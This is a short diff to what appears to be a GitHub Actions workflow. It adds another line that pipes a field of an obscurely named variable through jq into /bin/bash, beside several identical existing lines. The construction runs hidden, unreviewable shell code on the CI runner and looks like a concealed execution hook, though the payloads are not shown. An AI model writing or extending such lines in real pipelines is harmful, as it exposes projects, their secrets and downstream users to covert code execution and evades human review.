@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$xu670" | jq -r .iular7 | /bin/bash
           printf '%s' "$la230" | jq -r .hppt58 | /bin/bash
           printf '%s' "$p18" | jq -r .yrcoh0485 | /bin/bash
+          echo $flnhi1570 | jq -r .ls4 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
